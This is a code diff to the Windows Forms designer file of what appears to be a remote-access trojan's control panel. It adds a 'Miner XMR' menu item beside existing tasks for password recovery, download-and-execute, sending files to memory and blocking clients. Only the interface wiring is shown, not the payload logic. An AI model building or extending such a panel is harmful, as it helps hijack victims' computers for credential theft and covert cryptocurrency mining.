@@ -126,6 +126,7 @@
             this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
             this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
             this.TimerTask = new System.Windows.Forms.Timer(this.components);
+            this.minerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuClient.SuspendLayout();
             this.statusStrip1.SuspendLayout();
             this.tabControl1.SuspendLayout();
@@ -870,12 +871,13 @@
             this.pASSWORDRECOVERYToolStripMenuItem,
             this.downloadAndExecuteToolStripMenuItem,
             this.sENDFILETOMEMORYToolStripMenuItem1,
+            this.minerToolStripMenuItem1,
             this.uPDATEToolStripMenuItem1,
             this.toolStripSeparator4,
             this.dELETETASKToolStripMenuItem});
             this.contextMenuTasks.Name = "contextMenuStrip4";
             this.contextMenuTasks.ShowImageMargin = false;
-            this.contextMenuTasks.Size = new System.Drawing.Size(250, 170);
+            this.contextMenuTasks.Size = new System.Drawing.Size(250, 235);
             // 
             // pASSWORDRECOVERYToolStripMenuItem
             // 
@@ -939,6 +941,13 @@
             this.TimerTask.Enabled = true;
             this.TimerTask.Interval = 5000;
             this.TimerTask.Tick += new System.EventHandler(this.TimerTask_Tick);
+            // 
+            // minerToolStripMenuItem1
+            // 
+            this.minerToolStripMenuItem1.Name = "minerToolStripMenuItem1";
+            this.minerToolStripMenuItem1.Size = new System.Drawing.Size(249, 32);
+            this.minerToolStripMenuItem1.Text = "Miner XMR";
+            this.minerToolStripMenuItem1.Click += new System.EventHandler(this.MinerToolStripMenuItem1_Click);
             // 
             // Form1
             // 
@@ -1071,6 +1080,7 @@
         private System.Windows.Forms.ToolStripMenuItem blockClientsToolStripMenuItem;
         private System.Windows.Forms.ColumnHeader lv_ins;
         public System.Windows.Forms.ColumnHeader lv_ping;
+        private System.Windows.Forms.ToolStripMenuItem minerToolStripMenuItem1;
     }
 }
 
